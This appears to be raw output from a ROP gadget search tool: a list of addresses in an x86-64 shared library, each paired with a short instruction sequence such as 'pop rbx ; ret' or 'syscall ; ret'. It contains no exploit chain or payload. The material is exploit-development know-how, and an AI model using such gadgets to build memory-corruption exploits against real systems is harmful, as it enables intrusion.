0x00002aaaaabdda3a : add byte ptr [rax], al ; pop rbp ; ret
0x00002aaaaac75a7a : add byte ptr [rax], al ; pop rbx ; add byte ptr [rax], al ; rcl ah, 1 ; in al, dx ; call rsp
0x00002aaaaab7f08a : add byte ptr [rax], al ; pop rbx ; and eax, 0x3fc00 ; ret
0x00002aaaaab45b7e : add byte ptr [rax], al ; pop rbx ; mov eax, 0xffffffff ; pop rbp ; pop r12 ; ret
0x00002aaaaab0f89c : add byte ptr [rax], al ; pop rbx ; mov eax, dword ptr [rax + 0x58] ; ret
0x00002aaaaab1ca0f : add byte ptr [rax], al ; pop rbx ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x00002aaaaabeb1a5 : add byte ptr [rax], al ; pop rbx ; mov eax, esi ; pop rbp ; pop r12 ; ret
0x00002aaaaabd08e9 : add byte ptr [rax], al ; pop rbx ; mov eax, r8d ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab27c8c : add byte ptr [rax], al ; pop rbx ; mov eax, r8d ; pop rbp ; pop r12 ; ret
0x00002aaaaab44c80 : add byte ptr [rax], al ; pop rbx ; mov rax, rsi ; pop rbp ; pop r12 ; ret
0x00002aaaaaba1867 : add byte ptr [rax], al ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x00002aaaaaaf52df : add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaaafedaa : add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaaaf4b0e : add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab0a8d7 : add byte ptr [rax], al ; pop rbx ; pop rbp ; ret
0x00002aaaaaaff6d6 : add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaab68834 : add byte ptr [rax], al ; pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x00002aaaaac6872e : add byte ptr [rax], al ; pop rcx ; clc ; ret 0x6e1f
0x00002aaaaac6b8b6 : add byte ptr [rax], al ; pop rcx ; in eax, dx ; jmp rsp
0x00002aaaaac74f16 : add byte ptr [rax], al ; pop rdi ; jmp 0x19ff20
0x00002aaaaac78092 : add byte ptr [rax], al ; pop rsp ; add dword ptr [rax], 0xed52a800 ; jmp qword ptr [rsi]
0x00002aaaaac8d992 : add byte ptr [rax], al ; pop rsp ; fiadd dword ptr [rcx] ; add byte ptr [rax], bh ; fdivrp st(7) ; jmp rdi
0x00002aaaaac86e92 : add byte ptr [rax], al ; pop rsp ; outsd dx, dword ptr [rsi] ; add dword ptr [rax], eax ; cwde ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac74f92 : add byte ptr [rax], al ; pop rsp ; push rax ; add byte ptr [rax], al ; pop rax ; mov dh, 0xeb ; jmp qword ptr [rax]
0x00002aaaaac85592 : add byte ptr [rax], al ; pop rsp ; push rsi ; add dword ptr [rax], eax ; call 0x221afb20
0x00002aaaaac72992 : add byte ptr [rax], al ; pop rsp ; sub al, byte ptr [rax] ; add al, bh ; mov cl, ch ; jmp rsp
0x00002aaaaac83392 : add byte ptr [rax], al ; pop rsp ; xor al, 1 ; add byte ptr [rax], bh ; in al, dx ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac89c7a : add byte ptr [rax], al ; popfq ; add dword ptr [rax], eax ; adc bh, 0xf6 ; call qword ptr [rdi]
0x00002aaaaac6c0ee : add byte ptr [rax], al ; push 0xee ; jmp rsp
0x00002aaaaac7ac2e : add byte ptr [rax], al ; push rax ; jle 0x1a5c26 ; jmp qword ptr [rcx]
0x00002aaaaac705fe : add byte ptr [rax], al ; push rax ; jnp 0x19b605 ; jmp qword ptr [rdx]
0x00002aaaaac68ab4 : add byte ptr [rax], al ; push rax ; pop r9 ; clc ; ret 0x6e1f
0x00002aaaaabe9dde : add byte ptr [rax], al ; push rbp ; xor eax, eax ; mov rbp, rsp ; pop rbp ; ret
0x00002aaaaac8507a : add byte ptr [rax], al ; push rcx ; add dword ptr [rax], eax ; and byte ptr [rdx - 0xb], dh ; jmp qword ptr [rcx]
0x00002aaaaac85182 : add byte ptr [rax], al ; push rdx ; add dword ptr [rax], eax ; js 0x1b0206 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac8557a : add byte ptr [rax], al ; push rsi ; add dword ptr [rax], eax ; sar byte ptr [rdx - 0xb], 1 ; jmp qword ptr [rcx]
0x00002aaaaac7688a : add byte ptr [rax], al ; push rsp ; imul eax, dword ptr [rax], 0xed012000 ; call qword ptr [rsi]
0x00002aaaaac7708a : add byte ptr [rax], al ; push rsp ; jno 0x1a2098 ; add byte ptr [rax], dh ; in eax, dx ; call rdx
0x00002aaaaac7b98a : add byte ptr [rax], al ; push rsp ; mov edx, 0x73700000 ; out dx, eax ; call rax
0x00002aaaaac86d8a : add byte ptr [rax], al ; push rsp ; outsb dx, byte ptr [rsi] ; add dword ptr [rax], eax ; nop ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac6c44e : add byte ptr [rax], al ; push rsp ; xor ch, bh ; call rsp
0x00002aaaaac803d2 : add byte ptr [rax], al ; pushfq ; add al, 1 ; add byte ptr [rax], bl ; call rcx
0x00002aaaaac83dd2 : add byte ptr [rax], al ; pushfq ; add dword ptr ds:[rax], eax ; sub byte ptr [rdi], bl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84bd2 : add byte ptr [rax], al ; pushfq ; add qword ptr [rax], r8 ; call 0x221af152
0x00002aaaaac8d9d2 : add byte ptr [rax], al ; pushfq ; fiadd dword ptr [rcx] ; add al, ch ; fdivrp st(7) ; jmp rdi
0x00002aaaaac8a3d2 : add byte ptr [rax], al ; pushfq ; movsb byte ptr [rdi], byte ptr [rsi] ; add dword ptr [rax], eax ; test al, 0xf1 ; sti ; call rcx
0x00002aaaaaaeeee6 : add byte ptr [rax], al ; pushfq ; ret
0x00002aaaaac75a7e : add byte ptr [rax], al ; rcl ah, 1 ; in al, dx ; call rsp
0x00002aaaaaad5977 : add byte ptr [rax], al ; ret
0x00002aaaaac4aa06 : add byte ptr [rax], al ; ret 0
0x00002aaaaac5197e : add byte ptr [rax], al ; ret 0x10
0x00002aaaaaae345e : add byte ptr [rax], al ; ret 0x16
0x00002aaaaaaf360e : add byte ptr [rax], al ; ret 0x18bb
0x00002aaaaaaf0386 : add byte ptr [rax], al ; ret 0x18e7
0x00002aaaaac5364e : add byte ptr [rax], al ; ret 0x1d4
0x00002aaaaac53de6 : add byte ptr [rax], al ; ret 0x1d5
0x00002aaaaaad8fee : add byte ptr [rax], al ; ret 0x23
0x00002aaaaac52656 : add byte ptr [rax], al ; ret 0x24
0x00002aaaaaadaec6 : add byte ptr [rax], al ; ret 0x26
0x00002aaaaaad554c : add byte ptr [rax], al ; ret 0x2800
0x00002aaaaaae5e8e : add byte ptr [rax], al ; ret 0x30
0x00002aaaaaae27b6 : add byte ptr [rax], al ; ret 0x31
0x00002aaaaac52b46 : add byte ptr [rax], al ; ret 0x33
0x00002aaaaaad5886 : add byte ptr [rax], al ; ret 0x440c
0x00002aaaaaae0326 : add byte ptr [rax], al ; ret 0x4f
0x00002aaaaaadd656 : add byte ptr [rax], al ; ret 0x53
0x00002aaaaaae0536 : add byte ptr [rax], al ; ret 0x56
0x00002aaaaac5117e : add byte ptr [rax], al ; ret 0xa
0x00002aaaaac5157e : add byte ptr [rax], al ; ret 0xd
0x00002aaaaac72fee : add byte ptr [rax], al ; ret 0xffe9
0x00002aaaaaaf46ba : add byte ptr [rax], al ; ret 1
0x00002aaaaac54c22 : add byte ptr [rax], al ; ret 2
0x00002aaaaaad61c6 : add byte ptr [rax], al ; ret 3
0x00002aaaaaadc606 : add byte ptr [rax], al ; ret 4
0x00002aaaaaad656e : add byte ptr [rax], al ; ret 5
0x00002aaaaaae2d9e : add byte ptr [rax], al ; ret 6
0x00002aaaaac55622 : add byte ptr [rax], al ; ret 7
0x00002aaaaaad6a8a : add byte ptr [rax], al ; ret 8
0x00002aaaaac55a22 : add byte ptr [rax], al ; ret 9
0x00002aaaaac7ca7a : add byte ptr [rax], al ; retf ; add byte ptr [rax], al ; add byte ptr [rbp - 0x10], dl ; call qword ptr [rax]
0x00002aaaaaad638e : add byte ptr [rax], al ; rol byte ptr [rax + rax], 0 ; ret
0x00002aaaaac5501e : add byte ptr [rax], al ; rol byte ptr [rax + rax], 0 ; ret 4
0x00002aaaaac7917e : add byte ptr [rax], al ; rol byte ptr [rdx], 0xfd ; jmp rsp
0x00002aaaaac7965e : add byte ptr [rax], al ; rol dl, 1 ; in eax, dx ; jmp qword ptr [rsi]
0x00002aaaaac7c07a : add byte ptr [rax], al ; rol dword ptr [rax], 0 ; shl bl, 1 ; out dx, eax ; call rsp
0x00002aaaaac51426 : add byte ptr [rax], al ; ror byte ptr [rax + rax], 0 ; ret
0x00002aaaaac7ba1e : add byte ptr [rax], al ; sal byte ptr [rbp - 0x11], 1 ; jmp qword ptr [rax]
0x00002aaaaac5c38e : add byte ptr [rax], al ; sar ah, 1 ; int1 ; push rax ; cld ; int1 ; call qword ptr [rax]
0x00002aaaaab09eb9 : add byte ptr [rax], al ; sar eax, 0x1f ; sub edx, ecx ; not eax ; and eax, edx ; ret
0x00002aaaaac82652 : add byte ptr [rax], al ; sbb al, 0x27 ; add dword ptr [rax], eax ; js 0x1ad60b ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac84e52 : add byte ptr [rax], al ; sbb al, 0x4f ; add dword ptr [rax], eax ; cmp byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac85152 : add byte ptr [rax], al ; sbb al, 0x52 ; add dword ptr [rax], eax ; sub byte ptr [rbx - 0xb], dh ; call qword ptr [rsi]
0x00002aaaaac86f52 : add byte ptr [rax], al ; sbb al, 0x70 ; add dword ptr [rax], eax ; clc ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac7c152 : add byte ptr [rax], al ; sbb al, 0xc2 ; add byte ptr [rax], al ; call 0x281a6b8f
0x00002aaaaac7dd66 : add byte ptr [rax], al ; sbb byte ptr [rbp - 0xf], bl ; jmp qword ptr [rcx]
0x00002aaaaac71fb6 : add byte ptr [rax], al ; sbb byte ptr [rcx - 0x17], ah ; jmp rdx
0x00002aaaaac7f516 : add byte ptr [rax], al ; sbb byte ptr [rdx + rsi*8], ah ; jmp qword ptr [rcx]
0x00002aaaaac75766 : add byte ptr [rax], al ; sbb dl, cl ; in al, dx ; jmp rax
0x00002aaaaac7ad7a : add byte ptr [rax], al ; scasb al, byte ptr [rdi] ; add byte ptr [rax], al ; loopne 0x1a5d13 ; out dx, al ; call qword ptr [rsi]
0x00002aaaaac7c07e : add byte ptr [rax], al ; shl bl, 1 ; out dx, eax ; call rsp
0x00002aaaaac7f40e : add byte ptr [rax], al ; shl byte ptr [rdx], 0xf2 ; jmp qword ptr [rcx]
0x00002aaaaac5264e : add byte ptr [rax], al ; shl dword ptr [rax + rax], 0 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x24
0x00002aaaaab0b080 : add byte ptr [rax], al ; shl rax, cl ; or qword ptr [rdi], rax ; xor eax, eax ; ret
0x00002aaaaac7a30e : add byte ptr [rax], al ; shr byte ptr [rcx], 0xee ; jmp qword ptr [rdi]
0x00002aaaaabca216 : add byte ptr [rax], al ; shr ecx, 3 ; rep stosq qword ptr [rdi], rax ; ret
0x00002aaaaab4a9ae : add byte ptr [rax], al ; shr edx, 4 ; and edx, 1 ; mov eax, edx ; ret
0x00002aaaaab4aa9e : add byte ptr [rax], al ; shr edx, 5 ; and edx, 1 ; mov eax, edx ; ret
0x00002aaaaac72fe6 : add byte ptr [rax], al ; sub al, 0 ; add byte ptr [rax], al ; mov ah, 0x30 ; add byte ptr [rax], al ; ret 0xffe9
0x00002aaaaac81162 : add byte ptr [rax], al ; sub al, 0x12 ; add dword ptr [rax], eax ; fcomp st(1) ; call qword ptr [rsi]
0x00002aaaaac72962 : add byte ptr [rax], al ; sub al, 0x2a ; add byte ptr [rax], al ; pop rax ; mov cl, ch ; jmp qword ptr [rsi]
0x00002aaaaac83c62 : add byte ptr [rax], al ; sub al, 0x3d ; add dword ptr [rax], eax ; sbb al, 0xf5 ; call qword ptr [rdx]
0x00002aaaaac75762 : add byte ptr [rax], al ; sub al, 0x58 ; add byte ptr [rax], al ; sbb dl, cl ; in al, dx ; jmp rax
0x00002aaaaac7dd62 : add byte ptr [rax], al ; sub al, 0xde ; add byte ptr [rax], al ; sbb byte ptr [rbp - 0xf], bl ; jmp qword ptr [rcx]
0x00002aaaaac7f686 : add byte ptr [rax], al ; sub al, 0xf2 ; jmp rcx
0x00002aaaaac70062 : add byte ptr [rax], al ; sub al, 1 ; add byte ptr [rax], al ; call 0x111998ce
0x00002aaaaac90462 : add byte ptr [rax], al ; sub al, 5 ; add al, byte ptr [rax] ; cwde ; outsd dx, dword ptr [rsi] ; clc ; call rcx
0x00002aaaaac7e6f6 : add byte ptr [rax], al ; sub bh, ch ; int1 ; jmp rcx
0x00002aaaaac435ac : add byte ptr [rax], al ; sub eax, ecx ; ret
0x00002aaaaabd1140 : add byte ptr [rax], al ; sub eax, edx ; ret
0x00002aaaaac7c16f : add byte ptr [rax], al ; sub edi, edx ; call qword ptr [rdi]
0x00002aaaaab09efd : add byte ptr [rax], al ; sub edx, eax ; mov eax, edx ; sar eax, 0x10 ; ret
0x00002aaaaab51016 : add byte ptr [rax], al ; sub r8, rcx ; lea eax, dword ptr [r8 - 1] ; ret
0x00002aaaaab5f791 : add byte ptr [rax], al ; sub rax, rdx ; ret
0x00002aaaaabd1f35 : add byte ptr [rax], al ; syscall ; mov eax, edx ; ret
0x00002aaaaabcad2b : add byte ptr [rax], al ; syscall ; neg eax ; ret
0x00002aaaaabe94d5 : add byte ptr [rax], al ; syscall ; pop rdx ; pop rsi ; ret
0x00002aaaaab907c3 : add byte ptr [rax], al ; syscall ; ret
0x00002aaaaabdb7ed : add byte ptr [rax], al ; syscall ; test rax, rax ; jl 0x106840 ; je 0x106804 ; ret
0x00002aaaaac7a782 : add byte ptr [rax], al ; test al, 0 ; add byte ptr [rax + 0x37], cl ; out dx, al ; jmp qword ptr [rdx]
0x00002aaaaac77b26 : add byte ptr [rax], al ; test al, 0x48 ; in eax, dx ; jmp qword ptr [rdi]
0x00002aaaaac78096 : add byte ptr [rax], al ; test al, 0x52 ; in eax, dx ; jmp qword ptr [rsi]
0x00002aaaaac7ab26 : add byte ptr [rax], al ; test al, 0x73 ; out dx, al ; jmp qword ptr [rdx]
0x00002aaaaac7b226 : add byte ptr [rax], al ; test al, 0xe6 ; out dx, al ; call qword ptr [rax]
0x00002aaaaac7e436 : add byte ptr [rax], al ; test al, 0xe8 ; int1 ; call qword ptr [rbx]
0x00002aaaaac7e406 : add byte ptr [rax], al ; test al, 0xe8 ; int1 ; jmp qword ptr [rdi]
0x00002aaaaac825df : add byte ptr [rax], al ; test al, 0xf4 ; jmp qword ptr [rcx]
0x00002aaaaac70736 : add byte ptr [rax], al ; test bpl, al ; call qword ptr [rax]
0x00002aaaaac7074e : add byte ptr [rax], al ; test bpl, al ; jmp qword ptr [rcx]
0x00002aaaaac79cba : add byte ptr [rax], al ; test byte ptr [rbp + 0x1900000], bl ; out dx, al ; call qword ptr [rsi]
0x00002aaaaac74aba : add byte ptr [rax], al ; test byte ptr [rbx], cl ; add byte ptr [rax + 0x32], al ; jmp 0x19facc
0x00002aaaaac849ba : add byte ptr [rax], al ; test byte ptr [rdx + 1], cl ; add byte ptr [rax], ah ; pop rbx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac801ba : add byte ptr [rax], al ; test byte ptr [rdx], al ; add dword ptr [rax], eax ; in eax, -0xe ; call qword ptr [rsi]
0x00002aaaaac86dba : add byte ptr [rax], al ; test byte ptr [rsi + 1], ch ; add al, al ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac83dba : add byte ptr [rax], al ; test byte ptr [rsi], bh ; add dword ptr [rax], eax ; adc byte ptr [rdi], bl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac81dba : add byte ptr [rax], al ; test byte ptr [rsi], bl ; add dword ptr [rax], eax ; loopne 0x1acd5b ; hlt ; call qword ptr [rcx]
0x00002aaaaac44d72 : add byte ptr [rax], al ; test dl, 0x40 ; jne 0x16fd3b ; lea rax, qword ptr [rdi + 7] ; ret
0x00002aaaaac44da0 : add byte ptr [rax], al ; test dl, 4 ; jne 0x16fd3b ; lea rax, qword ptr [rdi + 3] ; ret
0x00002aaaaac7a87a : add byte ptr [rax], al ; test eax, 0x4f200000 ; out dx, al ; call qword ptr [rdx]
0x00002aaaaab09c56 : add byte ptr [rax], al ; test eax, 0x7fffff ; je 0x34c53 ; ret
0x00002aaaaac01c3f : add byte ptr [rax], al ; test eax, eax ; je 0x12cc58 ; xor eax, eax ; ret
0x00002aaaaab3fcbd : add byte ptr [rax], al ; test eax, eax ; jne 0x6acda ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab83023 : add byte ptr [rax], al ; test ebp, ebp ; mov r13, r15 ; setne dl ; jmp 0xae041
0x00002aaaaab85944 : add byte ptr [rax], al ; test ebp, ebp ; mov r13, r15 ; setne dl ; jmp 0xb0961
0x00002aaaaab880fb : add byte ptr [rax], al ; test ebp, ebp ; mov r13, r15 ; setne dl ; jmp 0xb3121
0x00002aaaaab40456 : add byte ptr [rax], al ; test ecx, ecx ; je 0x6b467 ; ret
0x00002aaaaab5bcee : add byte ptr [rax], al ; test edi, edi ; je 0x86d0b ; mov eax, 0x16 ; ret
0x00002aaaaac1088e : add byte ptr [rax], al ; test edx, edx ; jne 0x13b8ab ; mov eax, 1 ; ret
0x00002aaaaac108ce : add byte ptr [rax], al ; test edx, edx ; jne 0x13b8eb ; mov eax, 1 ; ret
0x00002aaaaac7f682 : add byte ptr [rax], al ; test qword ptr [rax], -0xdd3b800 ; jmp rcx
0x00002aaaaabe9c7d : add byte ptr [rax], al ; test rax, rax ; je 0x114cb7 ; call rax
0x00002aaaaabf3eb2 : add byte ptr [rax], al ; test rax, rax ; je 0x11eec8 ; mov rdi, rbx ; call rax
0x00002aaaaabf41aa : add byte ptr [rax], al ; test rax, rax ; je 0x11f1c0 ; mov rdi, rbx ; call rax
0x00002aaaaab5f96d : add byte ptr [rax], al ; test rax, rax ; je 0x8a98b ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac0d332 : add byte ptr [rax], al ; test rax, rax ; jne 0x138328 ; pop rbx ; ret
0x00002aaaaabd250c : add byte ptr [rax], al ; test rax, rax ; jne 0xfd4ea ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabd26cd : add byte ptr [rax], al ; test rax, rax ; jne 0xfd6aa ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac46e4e : add byte ptr [rax], al ; vmovdqu xmmword ptr [rdi], xmm0 ; vmovdqu xmmword ptr [rsi - 0x10], xmm0 ; ret
0x00002aaaaac7917a : add byte ptr [rax], al ; xchg eax, edx ; add byte ptr [rax], al ; rol byte ptr [rdx], 0xfd ; jmp rsp
0x00002aaaaac6aa82 : add byte ptr [rax], al ; xchg eax, esi ; or al, byte ptr [rax] ; add byte ptr [rbp + rbx*4 - 0x18], al ; call rsp
0x00002aaaaac6b206 : add byte ptr [rax], al ; xchg eax, esp ; adc ch, dl ; jmp rsp
0x00002aaaaac710ca : add byte ptr [rax], al ; xchg eax, esp ; adc dword ptr [rax], eax ; add byte ptr [rax], dl ; jno 0x19c0d9 ; jmp qword ptr [rdi]
0x00002aaaaac6b146 : add byte ptr [rax], al ; xchg eax, esp ; add al, 0xea ; call rsp
0x00002aaaaac84eca : add byte ptr [rax], al ; xchg eax, esp ; add qword ptr [r8], r8 ; loopne 0x1aff4a ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac6ad3e : add byte ptr [rax], al ; xchg eax, esp ; jg 0x195d31 ; jmp rsp
0x00002aaaaac7b7ca : add byte ptr [rax], al ; xchg eax, esp ; mov eax, 0x1e00000 ; out dx, eax ; jmp rsi
0x00002aaaaaaeeece : add byte ptr [rax], al ; xchg eax, esp ; ret
0x00002aaaaac7c1ca : add byte ptr [rax], al ; xchg eax, esp ; ret 0
0x00002aaaaac6be0e : add byte ptr [rax], al ; xchg eax, esp ; sbb esi, ebp ; call rsp
0x00002aaaaaae27ae : add byte ptr [rax], al ; xor al, 0 ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x31
0x00002aaaaac8266a : add byte ptr [rax], al ; xor al, 0x27 ; add dword ptr [rax], eax ; nop ; test al, 0xf4 ; jmp qword ptr [rcx]
0x00002aaaaac7366a : add byte ptr [rax], al ; xor al, 0x37 ; add byte ptr [rax], al ; or ch, 0xe9 ; call qword ptr [rdx]
0x00002aaaaac7d4e2 : add byte ptr [rax], al ; xor al, 0x80 ; add byte ptr [rax], al ; or byte ptr [rcx + rsi*8], bl ; jmp qword ptr [rcx]
0x00002aaaaac7c16a : add byte ptr [rax], al ; xor al, 0xc2 ; add byte ptr [rax], al ; add byte ptr [rbx], ch ; cli ; call qword ptr [rdi]
0x00002aaaaac7d86a : add byte ptr [rax], al ; xor al, 0xd9 ; add byte ptr [rax], al ; and dword ptr [rdi], ebp ; int1 ; jmp qword ptr [rax]
0x00002aaaaac7f06a : add byte ptr [rax], al ; xor al, 0xf1 ; add byte ptr [rax], al ; loopne 0x1aa08f ; call qword ptr [rdx]
0x00002aaaaac8f26a : add byte ptr [rax], al ; xor al, 0xf3 ; add dword ptr [rax], eax ; add byte ptr [rsi], dl ; clc ; call qword ptr [rdx]
0x00002aaaaac9076a : add byte ptr [rax], al ; xor al, 8 ; add al, byte ptr [rax] ; add byte ptr [rdx - 8], bh ; call qword ptr [rcx]
0x00002aaaaac74abe : add byte ptr [rax], al ; xor bpl, bl ; call qword ptr [rcx]
0x00002aaaaabd07da : add byte ptr [rax], al ; xor byte ptr [rcx], 0xc0 ; ret
0x00002aaaaac7f52e : add byte ptr [rax], al ; xor byte ptr [rdx + rsi*8], ah ; jmp qword ptr [rcx]
0x00002aaaaac7edde : add byte ptr [rax], al ; xor byte ptr [rdx], cl ; call rsi
0x00002aaaaac7708e : add byte ptr [rax], al ; xor byte ptr [rsi], ah ; in eax, dx ; call rdx
0x00002aaaaab7dffe : add byte ptr [rax], al ; xor ch, ch ; mov byte ptr [rdi], ch ; ret
0x00002aaaaabf2ef6 : add byte ptr [rax], al ; xor eax, eax ; add rsp, 0x28 ; ret
0x00002aaaaac18216 : add byte ptr [rax], al ; xor eax, eax ; add rsp, 0x38 ; ret
0x00002aaaaab0f08a : add byte ptr [rax], al ; xor eax, eax ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab8fc5c : add byte ptr [rax], al ; xor eax, eax ; add rsp, 8 ; ret
0x00002aaaaab02f2e : add byte ptr [rax], al ; xor eax, eax ; and edi, 0xffffff80 ; sete al ; ret
0x00002aaaaabd68f8 : add byte ptr [rax], al ; xor eax, eax ; cmp qword ptr [rsi], 0 ; je 0x101913 ; pop rbx ; ret
0x00002aaaaac0254e : add byte ptr [rax], al ; xor eax, eax ; jmp rcx
0x00002aaaaabf745b : add byte ptr [rax], al ; xor eax, eax ; mov dword ptr [rdi + 0xc], edx ; mov qword ptr [rsi], rdi ; ret
0x00002aaaaac02506 : add byte ptr [rax], al ; xor eax, eax ; pop rbx ; pop rbp ; jmp rcx
0x00002aaaaac0bed7 : add byte ptr [rax], al ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab8f9b6 : add byte ptr [rax], al ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; pop r14 ; ret
0x00002aaaaab0f26b : add byte ptr [rax], al ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab9c515 : add byte ptr [rax], al ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaab0eee3 : add byte ptr [rax], al ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab0ef06 : add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaab4c40e : add byte ptr [rax], al ; xor eax, eax ; test byte ptr [rdi], 4 ; sete al ; ret
0x00002aaaaab4c41e : add byte ptr [rax], al ; xor eax, eax ; test byte ptr [rdi], 8 ; sete al ; ret
0x00002aaaaab7f056 : add byte ptr [rax], al ; xor eax, eax ; test dh, 0xf0 ; je 0xaa02d ; movzx eax, dl ; pop rbx ; ret
0x00002aaaaab4f38e : add byte ptr [rax], al ; xor eax, eax ; test rdx, rdx ; jne 0x7a3a9 ; ret
0x00002aaaaab0ffbc : add byte ptr [rax], al ; xor eax, ecx ; ret
0x00002aaaaab61c01 : add byte ptr [rax], al ; xor edx, edx ; or cl, cl ; cmove rax, rdx ; ret
0x00002aaaaab2239b : add byte ptr [rax], al ; xor esi, esi ; call rax
0x00002aaaaabd7a16 : add byte ptr [rax], al ; xor esi, esi ; mov rdi, r12 ; call rbx
0x00002aaaaabd7a3b : add byte ptr [rax], al ; xor esi, esi ; mov rdi, r13 ; call rbx
0x00002aaaaabd7a5f : add byte ptr [rax], al ; xor esi, esi ; mov rdi, r14 ; call rbx
0x00002aaaaabd7a7f : add byte ptr [rax], al ; xor esi, esi ; mov rdi, r15 ; call rbx
0x00002aaaaaafea70 : add byte ptr [rax], al ; xor r9d, r9d ; call r15
0x00002aaaaab62f2d : add byte ptr [rax], al ; xor rax, rax ; ret
0x00002aaaaac86e37 : add byte ptr [rax], bh ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac8d997 : add byte ptr [rax], bh ; fdivrp st(7) ; jmp rdi
0x00002aaaaac83397 : add byte ptr [rax], bh ; in al, dx ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac84c37 : add byte ptr [rax], bh ; insd dword ptr [rdi], dx ; cmc ; call qword ptr [rax]
0x00002aaaaac82f37 : add byte ptr [rax], bh ; loop 0x1adf33 ; jmp qword ptr [rcx]
0x00002aaaaac831a7 : add byte ptr [rax], bh ; out -0xc, eax ; jmp qword ptr [rcx]
0x00002aaaaac84d37 : add byte ptr [rax], bh ; outsb dx, byte ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84e57 : add byte ptr [rax], bh ; outsd dx, dword ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac7f607 : add byte ptr [rax], bh ; sub dh, dl ; jmp qword ptr [rdi]
0x00002aaaaac83917 : add byte ptr [rax], bl ; add esi, ebp ; call qword ptr [rdi]
0x00002aaaaac7f517 : add byte ptr [rax], bl ; and al, 0xf2 ; jmp qword ptr [rcx]
0x00002aaaaac803d7 : add byte ptr [rax], bl ; call rcx
0x00002aaaaac71c27 : add byte ptr [rax], bl ; cmp ch, cl ; call qword ptr [rsi]
0x00002aaaaac84c07 : add byte ptr [rax], bl ; insd dword ptr [rdi], dx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac7ae67 : add byte ptr [rax], bl ; mov gs, esi ; call qword ptr [rcx]
0x00002aaaaac7dd67 : add byte ptr [rax], bl ; pop rbp ; int1 ; jmp qword ptr [rcx]
0x00002aaaaac7afe7 : add byte ptr [rax], bl ; push rsp ; cli ; call qword ptr [rax]
0x00002aaaaac865d7 : add byte ptr [rax], bl ; ret 0xfff5
0x00002aaaaac825f7 : add byte ptr [rax], bl ; test al, 0xf4 ; jmp qword ptr [rcx]
0x00002aaaaac72807 : add byte ptr [rax], bl ; xchg cl, ch ; jmp qword ptr [rcx]
0x00002aaaaac81ee7 : add byte ptr [rax], bl ; xchg eax, ebx ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac7d627 : add byte ptr [rax], bl ; xchg eax, ecx ; cld ; jmp qword ptr [rbx]
0x00002aaaaac87047 : add byte ptr [rax], ch ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac71bf7 : add byte ptr [rax], ch ; cmp ch, cl ; call qword ptr [rax]
0x00002aaaaac85157 : add byte ptr [rax], ch ; jae 0x1b0154 ; call qword ptr [rsi]
0x00002aaaaac84f17 : add byte ptr [rax], ch ; jo 0x1aff14 ; jmp qword ptr [rcx]
0x00002aaaaac7bfa7 : add byte ptr [rax], ch ; mov ch, 0xfb ; call qword ptr [rax]
0x00002aaaaac7e6f7 : add byte ptr [rax], ch ; out dx, eax ; int1 ; jmp rcx
0x00002aaaaac75437 : add byte ptr [rax], ch ; scasd eax, dword ptr [rdi] ; in al, dx ; jmp qword ptr [rcx]
0x00002aaaaac822f7 : add byte ptr [rax], ch ; wait ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac85847 : add byte ptr [rax], ch ; xchg ebp, esi ; jmp rax
0x00002aaaaaaed247 : add byte ptr [rax], cl ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], dl ; ret
0x00002aaaaaaeef27 : add byte ptr [rax], cl ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add dh, bl ; ret
0x00002aaaaaaeef0f : add byte ptr [rax], cl ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add dh, cl ; ret
0x00002aaaaaaeef3f : add byte ptr [rax], cl ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add dh, dh ; ret
0x00002aaaaab68874 : add byte ptr [rax], cl ; add byte ptr [rax], al ; je 0x93881 ; ret
0x00002aaaaac7ebb7 : add byte ptr [rax], cl ; add esi, edx ; call rdi
0x00002aaaaac86e07 : add byte ptr [rax], cl ; and dh, dh ; jmp qword ptr [rsi]
